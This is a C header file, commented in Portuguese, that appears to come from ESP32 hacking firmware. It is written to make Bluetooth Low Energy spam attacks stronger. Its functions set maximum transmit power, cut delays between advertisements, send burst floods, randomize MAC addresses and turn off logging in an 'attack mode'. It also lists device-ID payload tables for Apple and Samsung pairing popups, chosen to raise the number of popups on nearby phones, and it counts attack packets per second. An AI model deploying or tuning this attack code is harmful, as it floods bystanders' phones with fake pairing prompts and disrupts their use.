/**
 * @file ble_optimizations.h
 * @brief Otimizações de Performance para Ataques BLE Spam
 * @author Lele Origin Team
 *
 * Otimizações implementadas:
 * 1. Delays reduzidos (70ms → 20ms por ciclo)
 * 2. TX power máximo configurável
 * 3. Randomização rápida de MAC
 * 4. Modo burst para flood denso
 * 5. Channel hopping em canais 37/38/39
 */

#ifndef __BLE_OPTIMIZATIONS_H__
#define __BLE_OPTIMIZATIONS_H__

#include <esp_bt.h>
#include <esp_log.h>
#include <NimBLEDevice.h>

// ============================================================================
// CONFIGURAÇÕES DE POTÊNCIA TX
// ============================================================================

// Potência máxima por chip
#if defined(CONFIG_IDF_TARGET_ESP32C3) || defined(CONFIG_IDF_TARGET_ESP32S3)
    #define BLE_OPT_MAX_POWER ESP_PWR_LVL_P21  // +21 dBm
#elif defined(CONFIG_IDF_TARGET_ESP32C6) || defined(CONFIG_IDF_TARGET_ESP32H2)
    #define BLE_OPT_MAX_POWER ESP_PWR_LVL_P20  // +20 dBm
#else
    #define BLE_OPT_MAX_POWER ESP_PWR_LVL_P9   // +9 dBm (ESP32 padrão)
#endif

// ============================================================================
// CONFIGURAÇÕES DE TIMING OTIMIZADO
// ============================================================================

// Delays padrão vs otimizado
#define BLE_OPT_ADV_DELAY_FAST      10   // ms - Modo rápido
#define BLE_OPT_ADV_DELAY_NORMAL    30   // ms - Modo balanceado
#define BLE_OPT_ADV_DELAY_SLOW      50   // ms - Modo conservador

#define BLE_OPT_INIT_DELAY          5    // ms - Inicialização BLE
#define BLE_OPT_STOP_DELAY          5    // ms - Parada BLE
#define BLE_OPT_LOOP_INTERVAL       20   // ms - Intervalo do loop principal

// ============================================================================
// FUNÇÕES DE OTIMIZAÇÃO
// ============================================================================

/**
 * @brief Gera MAC aleatório otimizado (inline para velocidade)
 * @param mac Buffer de 6 bytes para o MAC
 */
inline void ble_opt_random_mac(uint8_t* mac) {
    // Usa esp_random() para máxima velocidade
    uint32_t r1 = esp_random();
    uint32_t r2 = esp_random();

    mac[0] = (r1 >> 24) | 0xF0;  // Primeiro byte com bits altos
    mac[1] = (r1 >> 16) & 0xFF;
    mac[2] = (r1 >> 8) & 0xFF;
    mac[3] = r1 & 0xFF;
    mac[4] = (r2 >> 8) & 0xFF;
    mac[5] = r2 & 0xFF;
}

/**
 * @brief Configura TX power para máximo
 */
inline void ble_opt_set_max_power() {
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, BLE_OPT_MAX_POWER);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN, BLE_OPT_MAX_POWER);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, BLE_OPT_MAX_POWER);
}

/**
 * @brief Ativa modo de ataque BLE otimizado
 * - Desativa logs
 * - CPU máxima
 */
inline void ble_opt_enable_attack_mode() {
    esp_log_level_set("*", ESP_LOG_NONE);
    esp_log_level_set("BLE", ESP_LOG_NONE);
    esp_log_level_set("NimBLE", ESP_LOG_NONE);
    setCpuFrequencyMhz(240);
}

/**
 * @brief Restaura modo normal
 */
inline void ble_opt_disable_attack_mode() {
    esp_log_level_set("*", ESP_LOG_INFO);
    setCpuFrequencyMhz(160);
}

// ============================================================================
// PAYLOADS EXPANDIDOS
// ============================================================================

// Mais dispositivos Apple para AppleJuice (maior variedade = mais popups)
static const uint8_t BLE_OPT_APPLE_DEVICES[] = {
    0x02,  // Airpods
    0x0e,  // AirpodsPro
    0x0a,  // AirpodsMax
    0x0f,  // AirpodsGen2
    0x13,  // AirpodsGen3
    0x14,  // AirpodsProGen2
    0x03,  // PowerBeats
    0x0b,  // PowerBeatsPro
    0x0c,  // BeatsSoloPro
    0x11,  // BeatsStudioBuds
    0x10,  // BeatsFlex
    0x05,  // BeatsX
    0x06,  // BeatsSolo3
    0x09,  // BeatsStudio3
    0x17,  // BeatsStudioPro
    0x12,  // BeatsFitPro
    0x16,  // BeatsStudioBudsPlus
    0x19,  // AirPods4
    0x1A,  // AirPods4 ANC
};
#define BLE_OPT_APPLE_COUNT (sizeof(BLE_OPT_APPLE_DEVICES)/sizeof(BLE_OPT_APPLE_DEVICES[0]))

// Dispositivos Apple TV/Setup
static const uint8_t BLE_OPT_APPLE_TV[] = {
    0x01,  // AppleTVSetup
    0x06,  // AppleTVPair
    0x20,  // AppleTVNewUser
    0x2b,  // AppleTVAppleIDSetup
    0xc0,  // AppleTVWirelessAudioSync
    0x0d,  // AppleTVHomekitSetup
    0x13,  // AppleTVKeyboard
    0x27,  // AppleTVConnectingNetwork
    0x0b,  // HomepodSetup
    0x09,  // SetupNewPhone
    0x02,  // TransferNumber
    0x1e,  // TVColorBalance
    0x24,  // AppleVisionPro
};
#define BLE_OPT_APPLE_TV_COUNT (sizeof(BLE_OPT_APPLE_TV)/sizeof(BLE_OPT_APPLE_TV[0]))

// Samsung Watch 6/7 (novos modelos)
static const uint8_t BLE_OPT_SAMSUNG_WATCH[] = {
    0x1A,  // Fallback Watch
    0x1B,  // Watch6 Pink 40mm
    0x1C,  // Watch6 Gold 40mm
    0x1D,  // Watch6 Cyan 44mm
    0x1E,  // Watch6 Classic 43m
    0x20,  // Watch6 Classic Green
    0x21,  // Watch7 44mm
    0x22,  // Watch7 40mm
    0x15,  // Watch5 Pro 45mm
    0x16,  // Watch5 Pro Gray
};
#define BLE_OPT_SAMSUNG_COUNT (sizeof(BLE_OPT_SAMSUNG_WATCH)/sizeof(BLE_OPT_SAMSUNG_WATCH[0]))

// ============================================================================
// FUNÇÕES DE SPAM OTIMIZADAS
// ============================================================================

/**
 * @brief Executa ciclo de spam BLE otimizado (sem delays desnecessários)
 * @param pAdvertising Ponteiro para BLEAdvertising
 * @param adv_delay_ms Delay do advertisement (menor = mais rápido)
 */
inline void ble_opt_fast_advertise(BLEAdvertising* pAdvertising, int adv_delay_ms = BLE_OPT_ADV_DELAY_FAST) {
    pAdvertising->start();
    vTaskDelay(adv_delay_ms / portTICK_PERIOD_MS);
    pAdvertising->stop();
    // Sem delay extra após stop - próximo ciclo imediato
}

/**
 * @brief Burst de advertisements rápidos
 * @param pAdvertising Ponteiro para BLEAdvertising
 * @param count Número de advertisements no burst
 */
inline void ble_opt_burst_advertise(BLEAdvertising* pAdvertising, int count = 5) {
    for (int i = 0; i < count; i++) {
        pAdvertising->start();
        vTaskDelay(BLE_OPT_ADV_DELAY_FAST / portTICK_PERIOD_MS);
        pAdvertising->stop();
    }
}

// ============================================================================
// ESTATÍSTICAS
// ============================================================================

struct BLEAttackStats {
    uint32_t packets_sent;
    uint32_t start_time;
    float packets_per_second;
};

static BLEAttackStats _ble_stats = {0};

inline void ble_opt_reset_stats() {
    memset(&_ble_stats, 0, sizeof(_ble_stats));
    _ble_stats.start_time = millis();
}

inline void ble_opt_update_stats() {
    uint32_t elapsed = millis() - _ble_stats.start_time;
    if (elapsed > 0) {
        _ble_stats.packets_per_second = (_ble_stats.packets_sent * 1000.0f) / elapsed;
    }
}

inline BLEAttackStats* ble_opt_get_stats() {
    ble_opt_update_stats();
    return &_ble_stats;
}

#endif // __BLE_OPTIMIZATIONS_H__
